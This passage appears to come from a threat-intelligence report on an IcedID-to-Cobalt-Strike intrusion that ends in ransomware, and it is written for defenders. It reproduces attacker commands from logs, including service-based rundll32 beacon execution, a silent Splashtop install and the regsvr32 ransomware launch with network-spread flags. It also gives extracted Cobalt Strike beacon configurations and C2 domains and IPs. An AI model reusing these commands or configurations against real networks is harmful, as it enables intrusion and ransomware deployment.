filenames indicated in the 'Info' column suggest that the data involves a DLL file named 'c64.dll' located in the 'ProgramData' directory.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                                              |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ------------------------------------------------- |\n  | 10               | 59472    | 10               | 445      | 348     | 353,895 / 373,608 | Filename: ProgramData\\c64.dll DeployDebug ...less |\n  | 10               | 51386    | 10               | 445      | 43      | 8,049 / 10,535    | Filename: ProgramData\\c64.dll ProgramData         |\n  | 10               | 51206    | 10               | 445      | 632     | 687,236 / 724,665 | Filename: ProgramData\\c64.dll ProgramData         |\n```\n\nServices were then created on the hosts to execute the uploaded Cobalt Strike Beacons.\n\n```image\nAlt: Service Creation\nDescription: The image is a screenshot of a log data table that appears to show event data related to system services. It includes columns for the system channel, service name, image path, and account name. The specific entries indicate services associated with 'cmd.exe' executing 'rundll32.exe' with a DLL file located in 'C:\\ProgramData'. This log data is likely relevant to analyzing malicious service creation and execution related to the Cobalt Strike campaign.\nTranscription: |\n  | data.win.system.channel | data.win.eventdata.serviceName | data.win.eventdata.imagePath                     | data.win.eventdata.accountName |\n  | ----------------------- | ------------------------------ | ------------------------------------------------ | ------------------------------ |\n  | System                  | 3999954                        | cmd.exe /c rundll32.exe \\\\c$\\ProgramData\\c64.dll | LocalSystem                    |\n  | System                  | 0b94ebd                        | cmd.exe /c rundll32.exe \\\\c$\\ProgramData\\c64.dll | LocalSystem                    |\n```\n\nOn the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a table displaying network traffic data related to two executable files involved in a lateral movement attack. It includes columns for source IP/country, source port, destination IP/country, destination port, packet count, bytes transferred, and associated filenames. The filenames listed are '61582ab.exe' and '044b7e1.exe', which are linked to the Cobalt Strike malware operation. The data provides specific metrics about the network activity and file transfers that occurred during the attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                  |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | --------------------- |\n  |                  | 53261    |                  | 445      | 560     | 616,404 / 648,504 | Filename: 61582ab.exe |\n  |                  | 53253    |                  | 445      | 561     | 616,404 / 648,334 | Filename: 044b7e1.exe |\n```\n\nThe beacons were then executed using a remote service.\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a screenshot of Event ID 7045 from the Windows Event Viewer, indicating that a service was installed on the system. It includes key details such as the Service Name ('044b7e1'), Service File Name (pointing to a file on a network share), Service Type (user mode service), Service Start Type (demand start), and the Service Account (LocalSystem). This information is relevant for understanding the context of lateral movement and service creation related to a ransomware attack.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: 044b7e1\n  Service File Name: \\\\ADMIN$\\044b7e1.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nKnown Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons. Named pipes connections can be observed through Sysmon Event ID 18.\n\nNote that the named pipes followed **MSSE-[0-9]{4}-server** pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:\n\n```\npipeName: \\MSSE-3328-server and Image: 61582ab.exe\npipeName: \\MSSE-7344-server and Image: 044b7e1.exe\n```\n\n```image\nAlt: Named Pipes\nDescription: The image displays a Sysmon event log entry related to a named pipe connection in a Windows environment. The log includes detailed information such as EventCode (18), EventType (4), and the computer name obscured for privacy. It shows the message indicating a pipe connection, providing a rule name associated with the SMB technique. Additionally, it lists the timestamp, process GUID, process ID, and the specific named pipe being connected to, demonstrating the technical details of a potential lateral movement activity in a cyber threat context.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=18\n  EventType=4\n  ComputerName=DC Name\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=1717578\n  Keywords=None\n  TaskCategory=Pipe Connected (rule: PipeEvent)\n  OpCode=Informations\n  Message=Pipe Connected:\n  RuleName: technique_id=T1021.002, technique_name=SMB/Windows Admin Shares\n  EventType=ConnectPipe\n  UtcTime=22:13:29.104\n  ProcessGuid={f2bd618e-3a87-61ca-1808-020000000600}\n  ProcessId=9088\n  PipeName=\\MSSE-3328-server\n  Image=61582ab.exe\n```\n\n```image\nAlt: Named Pipes\nDescription: The image displays a Sysmon event log detailing a named pipe connection event. It includes various fields such as LogName, EventCode, ComputerName (redacted), User, TaskCategory, and message details indicating a 'Pipe Connected' event. The image shows a specific PipeName '\\MSSE-7344-server' associated with an executable image '044b7e1.exe', highlighting the technical attributes relevant to lateral movement in a cyber threat context.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=18\n  EventType=4\n  ComputerName=DC Name\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=647444\n  Keywords=None\n  TaskCategory=Pipe Connected (rule: PipeEvent)\n  OpCode=Informations\n  Message=Pipe Connected:\n  RuleName: technique_id=T1021.002, technique_name=SMB/Windows Admin Shares\n  EventType=ConnectPipe\n  UtcTime=22:13:17.006\n  ProcessGuid={47d5446d-3a7b-61ca-f933-000000000500}\n  ProcessId=7492\n  PipeName: \\MSSE-7344-server\n  Image: \\044b7e1.exe\n```\n\n## Command and Control\n\nWe observed the IcedID DLL dropping multiple CS beacons on the beachhead.\n\n```image\nAlt: CS Beacons\nDescription: The image is a flowchart depicting the process related to the IcedID DLL and its operation within a cyber threat context. It shows how the IcedID DLL drops multiple Cobalt Strike beacons, along with specifics such as the command used to register the DLL and the various associated file names (e.g., ljucko32.dll, Ewge.dll). Additionally, it lists several IP addresses and domain names that are relevant to the Cobalt Strike beacons, highlighting their significance in the cyber attack narrative.\nTranscription: |\n  IcedID DLL\n      |\n      |-- Dropped multiple Cobalt Strike Beacons\n             |-- ljucko32.dll\n             |-- Ewge.dll\n             |-- Edebef4.dll\n             |-- Faicuy4.exe\n      |\n      |-- regsvr32.exe C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\baeb13eea3a71cfaba9d20ef373dcea69cf31f2ec21f45b83f29f699330cb3e3.dll\n      |\n      |-- IP: 5.181.80.1[214:80] guguchrome[.]com\n      |-- IP: 5.181.80.113[443] applesflying[.]com\n      |-- IP: 103.208.86[17:80] bunced[.]net\n      |-- IP: 172.241.29[192:443] wayeyoy[.]com\n```\n\n```image\nAlt: CS Beacons\nDescription: The image is a screenshot of a log or data table displaying various attributes related to file downloads initiated by the process 'regsvr32.exe'. It includes columns for action type, initiating process file name, initiating process command line, initiating process folder path, initiating process parent file name, and file name. The data appears to show multiple instances where files were downloaded from the internet, with specific details about the commands and locations involved in the process.\nTranscription: |\n  | Action Type                       | Initiating Process File Name | Initiating Process Command Line                                                                              | Initiating Process Folder Path | Initiating Process Parent File Name | File Name    |\n  | --------------------------------- | ---------------------------- | ------------------------------------------------------------------------------------------------------------ | ------------------------------ | ----------------------------------- | ------------ |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Edebef4.dll  |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Ewge.dll     |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | ljucko32.dll |\n  | LoblinsDownloadedFileFromInternet | regsvr32.exe                 | C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\baeb13eea3a71fcfab9d20ef373dcea69cf31f22ec2f145b83729f699930cb3e3.dll | C:\\Windows\\System32            | cmd.exe                             | Faicuy4.exe  |\n```\n\n### Splashtop Streamer\n\nThreat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.\n\nBy default, the Splashtop Streamer is automatically installed together with the AteraAgent.\n\n```image\nAlt: Splashtop Streamer\nDescription: The image displays a table containing information on two computers: \"Beachhead\" and \"Domain Controller.\" For each computer, it lists the initiating process command line, which includes the executable name \"AgentPackageSTRemote.exe\" followed by a unique identifier, as well as the remote URLs associated with each machine. The table provides critical details relevant to the Splashtop Streamer usage in a cyber threat context.\nTranscription: |\n  | Computer Name     | Initiating Process Command Line                                                                               | Remote URL             |\n  | ----------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------- |\n  | Beachhead         | \"AgentPackageSTRemote.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"3cff8f1c-e549-4c1f-aabc-343b457afaca\" agent- | my.splashtop.com       |\n  |                   | \"AgentPackageSTRemote.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"3cff8f1c-e549-4c1f-aabc-343b457afaca\" agent- | download.splashtop.com |\n  | Domain Controller | \"AgentPackageSTRemote.exe\" 48e674a2-3563-48a1-a224-8ce2e9aada26 \"2e346c4a-b87a-443b-b4d8-d899ea8688c3\" agent- | my.splashtop.com       |\n  |                   | \"AgentPackageSTRemote.exe\" 48e674a2-3563-48a1-a224-8ce2e9aada26 \"2e346c4a-b87a-443b-b4d8-d899ea8688c3\" agent- | download.splashtop.com |\n```\n\n```image\nAlt: Splashtop Streamer\nDescription: The image displays a table containing details about network activity related to the use of Splashtop Streamer in a cyber threat intelligence context. It includes columns for 'Computer Name', 'Initiating Process File Name', and 'Process Command Line'. Two entries are shown: one for 'Beachhead' and another for 'Domain Controller', both indicating the use of 'AgentPackageSTRemote.exe' as the initiating process, along with specific command line arguments that detail how the Splashtop Streamer was used to establish remote connections.\nTranscription: |\n  | Computer Name     | Initiating Process File Name | Process Command Line                                                                                                                                                                                                                                                          |\n  | ----------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Beachhead         | AgentPackageSTRemote.exe     | \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_code=hZCDFPhK75mJ\" \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_session_pwd=f8154387506a04e293954372a28e366b\" \"SplashtopStreamer3360.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 |\n  | Domain Controller | AgentPackageSTRemote.exe     | \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_code=hZCDFPhK75mJ\" \"SRUtility.exe\" -a \"st-streamer://com.splashtop.streamer/?rmm_session_pwd=4eaec1d030f49d48001e131a10f801c1\" \"SplashtopStreamer3360.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 |\n```\n\nSplashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:\n\n```image\nAlt: Splashtop Connections\nDescription: The image is a network diagram showing connections to various Splashtop relay servers from a central point labeled \"SRManager.exe.\" It displays multiple IP addresses associated with relay.splashtop.com, visually illustrating the connections and flow of data between these servers and the SRManager process. The diagram highlights the extent of the communication with the Splashtop service, indicating potential paths of remote access used by threat actors.\nTranscription: |\n  \"SRManager.exe\"\n      ├── 54-185-153-29.relay.splashtop.com\n      ├── 129-146-44-44.relay.splashtop.com\n      ├── 129-146-110-111.relay.splashtop.com\n      ├── 35-212-250-230.relay.splashtop.com\n      ├── 129-146-178-19.relay.splashtop.com\n      ├── 152-70-151-144.relay.splashtop.com\n      ├── st-v3-univ-srs-win-3484-g3.api.splashtop.com\n      ├── 152-70-137-190.relay.splashtop.com\n      ├── 54-245-159-230.relay.splashtop.com\n      ├── 129-146-60-216.relay.splashtop.com\n      ├── 132-226-26-231.relay.splashtop.com\n      ├── 35-212-219-253.relay.splashtop.com\n      ├── 129-146-104-247.relay.splashtop.com\n      ├── 129-146-166-188.relay.splashtop.com\n      ├── 53-52-245-62.relay.splashtop.com\n      ├── 129-146-179-153.relay.splashtop.com\n      ├── 35-215-102-184.relay.splashtop.com\n      ├── 129-146-179-126.relay.splashtop.com\n      ├── 129-146-123-170.relay.splashtop.com\n      ├── 129-146-110-88.relay.splashtop.com\n      ├── 129-146-62-33.relay.splashtop.com\n      ├── s.v.symcb.com\n      ├── 129-146-74-225.relay.splashtop.com\n      ├── 129-146-197-145.relay.splashtop.com\n      ├── 158-101-29-18.relay.splashtop.com\n      ├── 129-146-70-251.relay.splashtop.com\n      ├── 129-146-108-138.relay.splashtop.com\n      ├── 129-146-164-49.relay.splashtop.com\n      ├── 152-70-130-227.relay.splashtop.com\n      ├── 35-215-90-140.relay.splashtop.com\n      ├── 129-146-168-90.relay.splashtop.com\n      ├── 54-67-176-126.relay.splashtop.com\n      ├── 35-212-225-149.relay.splashtop.com\n      ├── 129-146-249-100.relay.splashtop.com\n      ├── 54-218-114-207.relay.splashtop.com\n      ├── st-relay.v3-univ-srs-win-3484-g3.api.splashtop.com\n      ├── s2.symcb.com\n      ├── 129-146-174-231.relay.splashtop.com\n      └── 129-146-67-93.relay.splashtop.com\n```\n\n### Cobalt Strike\n\nWe observed a default Cobalt Strike malleable C2 profile, using the jquery agent string. This activity can be detected with relative ease by the ET rules.\n\n```image\nAlt: Cobalt Strike Profile\nDescription: The image displays a series of HTTP request logs from a server (shytur.com) that include various POST and GET requests to specific jQuery minified JavaScript files. Each entry shows the IP address (179.43.176.93), the HTTP method (either POST or GET), and the endpoint being accessed (e.g., /jquery-3.3.2.min.js). The requests also include query parameters that seem to be related to a Cloudflare device ID, which indicates that these requests might be part of an automated process or exploit.\nTranscription: |\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=KZeFqH1lsHcp7dxHac\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=26Esc5dtYbNW7Wh1Y\n  179.43.176.93  80  GET   shytur.com  /jquery-3.3.2.min.js?_cfduid=9–5P87JgQ_Cyo0Gww\n  179.43.176.93  80  POST  shytur.com  /jquery-3.3.2.min.js?_cfduid=Cwv60T7JAN9zw5wPA\n```\n\nThere appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.\n\n```image\nAlt: Cobalt Strike Alerts\nDescription: The image displays a series of timestamps, each followed by the word 'alert' in red text. This suggests a log of alerts generated over time, likely related to detected activities from the Cobalt Strike malware as mentioned in the CTI context.\nTranscription: |\n  2021-12-27T23:45:21.187 alert\n  2021-12-27T23:40:06.862 alert\n  2021-12-27T23:40:06.334 alert\n  2021-12-27T23:40:05.536 alert\n  2021-12-27T23:40:05.304 alert\n  2021-12-27T23:40:04.623 alert\n  2021-12-27T23:40:04.030 alert\n  2021-12-27T23:40:03.794 alert\n  2021-12-27T23:40:03.713 alert\n```\n\nJust based on the ET Cobalt Strike rule, ‘ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response’, there were in excess of 6K alerts generated.\n\nDue to the length of this intrusion, we observed the threat actors handing off between C2 servers. We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.\n\n```image\nAlt: C2 Servers\nDescription: The image is a graph displaying the count of events related to various domains over time, specifically for Cobalt Strike activities. Different colors represent different domains: 'bunced.net' in green, 'wayeyoy.com' in blue, 'cirite.com' in purple, 'shytur.com' in red, and another instance of 'shytur.com' in a different shade. The y-axis indicates the count of events, while the x-axis represents time, arranged in 12-hour intervals. The peaks and valleys of the graph illustrate fluctuations in activity, suggesting varying levels of network traffic or alerts generated by these domains.\nTranscription: |\n  {\n    \"bunced.net\": {\n      \"ip\": \"103.208.86.7\",\n      \"count\": 25000\n    },\n    \"wayeyoy.com\": {\n      \"ip\": \"172.241.29.192\",\n      \"count\": 15000\n    },\n    \"cirite.com\": {\n      \"ip\": \"23.81.246.30\",\n      \"count\": 10000\n    },\n    \"shytur.com\": {\n      \"ip\": \"216.73.159.33\",\n      \"count\": 5000\n    }\n  }\n```\n\nIcedID:\n\n```\nguguchrome.com\n5.181.80.214:80\n```\n\n```\napplesflying.com\n5.181.80.113:443\nJa3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [89:ac:17:b1:f1:b6:9e:c8:bb:e5:f3:59:ac:e4:91:b2:91:f4:85:58 ]\nNot Before: 2021/12/08 20:30:05 UTC\nNot After: 2022/12/08 20:30:05 UTC\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n```\nbunced.net\n103.208.86.7:80\n103.208.86.7:443\nJa3: 0eecb7b1551fba4ec03851810d31743f\nJA3s:10b29985cd0ecd878ac083f059c42d51\nCertificate: [8f:98:c5:f8:48:96:b6:cd:13:91:7c:4c:32:85:db:b7:e5:e1:bc:8f ]\nNot Before: 2021/12/09 10:32:43 UTC\nNot After: 2022/03/09 10:32:42 UTC\nIssuer Org: Let's Encrypt\nSubject Common: bunced.net\nPublic Algorithm: id-ec\nPublicKey Curve: secp384r1\n```\n\n```\n{\n  \"x64\": {\n    \"sha256\": \"01a4c5ef0410b379fa83ac1a4132ba6f7b5814192dbdb87e9d7370e6256ea528\",\n    \"md5\": \"21242d958caf225f76ad71a4d3a6d4d9\",\n    \"config\": {\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Port\": 80,\n      \"Watermark\": 0,\n      \"C2 Host Header\": \"\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"C2 Server\": \"bunced.net,/jquery-3.3.1.min.js\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 5000\n    },\n    \"time\": 1639100549541.8,\n    \"sha1\": \"04bbd0ffa580dd5a85ce4c7fc19c66cc753e45ff\",\n    \"uri_queried\": \"/uKVG\"\n  },\n  \"x86\": {\n    \"sha256\": \"9c01afed2a863fa2466679ef53127e925963cc95de98bc4c59cb4743ccc73bf5\",\n    \"md5\": \"e7df03bc59b478f0588039416b845c7f\",\n    \"config\": {\n      \"Jitter\": 10,\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Port\": 80,\n      \"Watermark\": 0,\n      \"C2 Host Header\": \"\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"C2 Server\": \"bunced.net,/jquery-3.3.1.min.js\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 5000\n    },\n    \"time\": 1639100538593.3,\n    \"sha1\": \"18ddb5fac720599983791036e43154a9ce67ffde\",\n    \"uri_queried\": \"/Uq4b\"\n  }\n}\n```\n\n```\nshytur.com\n179.43.176.93:80\n216.73.159.33:80\n179.43.176.80:80\n```\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"Port\": 80,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Polling\": 5000,\n      \"Method 2\": \"POST\",\n      \"C2 Server\": \"shytur.com,/jquery-3.3.1.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Watermark\": 0,\n      \"Jitter\": 10,\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\"\n    },\n    \"uri_queried\": \"/RnJS\",\n    \"md5\": \"22bbd14a893b19220e829940ad474687\",\n    \"sha256\": \"10084d7146462d06c599bd14664d14c511b40687e21983e6f8bded06982931a9\",\n    \"sha1\": \"06ef512d5a2b9353b6d0a412a1876e02d3474527\",\n    \"time\": 1640639559417.7\n  },\n  \"x86\": {\n    \"config\": {\n      \"Port\": 80,\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Polling\": 5000,\n      \"Method 2\": \"POST\",\n      \"C2 Server\": \"shytur.com,/jquery-3.3.1.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Method 1\": \"GET\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"Watermark\": 0,\n      \"Jitter\": 10,\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\"\n    },\n    \"uri_queried\": \"/COPz\",\n    \"md5\": \"a48fbea91a31afaf348f713b1f59dfbf\",\n    \"sha256\": \"d281caef6c8fc45d8725d6cd1542234aea35b97b99bb6aaff7688d91a10716f0\",\n    \"sha1\": \"7d700ad69d2800de159af5f50bbb82e89467d8b4\",\n    \"time\": 1640639554775.3\n  }\n}\n```\n\n```\ncirite.com\n23.81.246.30\nJa3: a0e9f5d64349fb13191bc781f81f42e1\nJa3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [f1:43:f2:43:29:79:35:ad:b5:60:c7:79:3a:0f:c6:68:a3:f2:d5:d1 ]\nNot Before: 2021/10/22 00:00:00 UTC\nNot After: 2022/10/22 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: cirite.com [cirite.com ,www.cirite.com]\nPublic Algorithm: rsaEncryption\n```\n\n```\n{\n  \"beacontype\": [\n    \"HTTPS\"\n  ],\n  \"sleeptime\": 5000,\n  \"jitter\": 20,\n  \"maxgetsize\": 1864736,\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"license_id\": 0,\n  \"cfg_caution\": false,\n  \"kill_date\": null,\n  \"server\": {\n    \"hostname\": \"cirite.com\",\n    \"port\": 443,\n    \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNZaG28qpSpw7xhHStBrU+s2eWiOIBlBERsSzWagdI1TzzJHc/EvkkAx3p2NrSkmd3/CoHejTabftxOT7DmjsfLSTOJJy7CETGzCN/Yu3Y+5gYapIgy9h96hXVJJkrU2dFPXAvdWBeYq/5B8wR07jWusXvvb5STypVWiPfKVcrkQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n  },\n  \"host_header\": \"\",\n  \"useragent_header\": null,\n  \"http-get\": {\n    \"uri\": \"/posting\",\n    \"verb\": \"GET\",\n    \"client\": {\n      \"headers\": null,\n      \"metadata\": null\n    },\n    \"server\": {\n      \"output\": [\n        \"print\",\n        \"prepend 600 characters\",\n        \"base64\",\n        \"base64url\"\n      ]\n    }\n  },\n  \"http-post\": {\n    \"uri\": \"/extension\",\n    \"verb\": \"POST\",\n    \"client\": {\n      \"headers\": null,\n      \"id\": null,\n      \"output\": null\n    }\n  },\n  \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"crypto_scheme\": 0,\n  \"proxy\": {\n    \"type\": null,\n    \"username\": null,\n    \"password\": null,\n    \"behavior\": \"Use IE settings\"\n  },\n  \"http_post_chunk\": 0,\n  \"uses_cookies\": true,\n  \"post-ex\": {\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\"\n  },\n  \"process-inject\": {\n    \"allocator\": \"VirtualAllocEx\",\n    \"execute\": [\n      \"CreateThread\",\n      \"CreateRemoteThread\",\n      \"RtlCreateUserThread\"\n    ],\n    \"min_alloc\": 23886,\n    \"startrwx\": false,\n    \"stub\": \"Ms1B7fCBDFtfSY7fRzHMbQ==\",\n    \"transform-x86\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"transform-x64\": [\n      \"prepend '\\\\x90\\\\x90\\\\x90'\"\n    ],\n    \"userwx\": false\n  },\n  \"dns-beacon\": {\n    \"dns_idle\": null,\n    \"dns_sleep\": null,\n    \"maxdns\": null,\n    \"beacon\": null,\n    \"get_A\": null,\n    \"get_AAAA\": null,\n    \"get_TXT\": null,\n    \"put_metadata\": null,\n    \"put_output\": null\n  },\n  \"pipename\": null,\n  \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"stage\": {\n    \"cleanup\": true\n  },\n  \"ssh\": {\n    \"hostname\": null,\n    \"port\": null,\n    \"username\": null,\n    \"password\": null,\n    \"privatekey\": null\n  }\n}\n```\n\n```\nwayeyoy.com\n172.241.29.192:443\nCertificate: [00:e7:34:3a:ad:bc:61:59:16:5e:d4:2b:e7:64:fa:8c:d5:42:40:17]\nNot Before: 2021/12/07 00:00:00 UTC\nNot After: 2022/12/07 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: wayeyoy.com [wayeyoy.com ,www.wayeyoy.com]\nPublic Algorithm: rsaEncryption\n```\n\nA configuration was not obtained for this server.\n\n## Exfiltration\n\nWe did not observe any exfiltration indicators while analyzing host and network forensic artifacts.\n\nThis does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.\n\n## Impact\n\nOn the 19th day of the intrusion, the threat actors prepared for their final objectives. From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server. On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload. From that host however the attempt failed.\n\nThe threat actors then proceeded to look for other elevation paths. After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers. Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.\n\nThe threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.\n\n```image\nAlt: Ransomware Deployment\nDescription: The image displays a table summarizing various actions taken during a ransomware attack. It includes columns for 'Action Type', 'Initiating Process Command Line', and 'File Name'. The actions recorded show instances of file creation and process creation, specifically detailing the execution of a command line script 'backup.bat' and the subsequent creation of a DLL file named 'x64.dll'. This data is likely part of a log from a system monitoring tool, providing insights into the activities linked to the ransomware deployment.\nTranscription: |\n  | Action Type    | Initiating Process Command Line                                              | Process Command Line            | File Name  |\n  | -------------- | ---------------------------------------------------------------------------- | ------------------------------- | ---------- |\n  | FileCreated    | svchost.exe -k UnistackSvcGroup -s CDPUserSvc                                | cmd.exe /C backup.bat           | backup.bat |\n  | ProcessCreated | svchost.exe -k UnistackSvcGroup -s CDPUserSvc                                | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | cmd.exe /C backup.bat           |            |\n  | ProcessCreated |                                                                              | conhost.exe 0xffffffff -ForceV1 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 